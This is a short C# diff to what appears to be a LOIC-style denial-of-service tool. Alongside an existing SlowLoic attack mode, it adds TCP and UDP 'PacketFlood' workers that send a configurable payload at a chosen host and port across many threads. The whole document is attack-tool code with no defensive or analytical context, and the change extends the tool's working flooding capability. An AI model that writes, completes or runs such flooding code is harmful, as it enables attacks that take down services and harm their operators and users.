@@ -25,6 +25,7 @@ namespace GAS.Core
         #endregion
         static IPAddress locolhaust = IPAddress.Parse("127.0.0.1");
         public IAttacker Worker;
+        public string Data;
         public bool LockOn(string host)
         {
             host = host.Trim().ToLower();
@@ -67,8 +68,10 @@ namespace GAS.Core
                     Worker=new SlowLoic(Target.ToString(), Target.ToString(), Port, Subsite, Delay, Timeout, AppendRANDOMChars || AppendRANDOMCharsUrl, SPT, AppendRANDOMCharsUrl,USEGet, UseGZIP, Threads);
                     break;
                 case AttackMethod.TCP:
+                    Worker = new PacketFlood(Target.ToString(), Port, 1, Delay, WaitForResponse, Data, AppendRANDOMChars, Threads);
                     break;
                 case AttackMethod.UDP:
+                    Worker = new PacketFlood(Target.ToString(), Port, 2, Delay, WaitForResponse, Data, AppendRANDOMChars, Threads);
                     break;
             }
             Worker.Start();
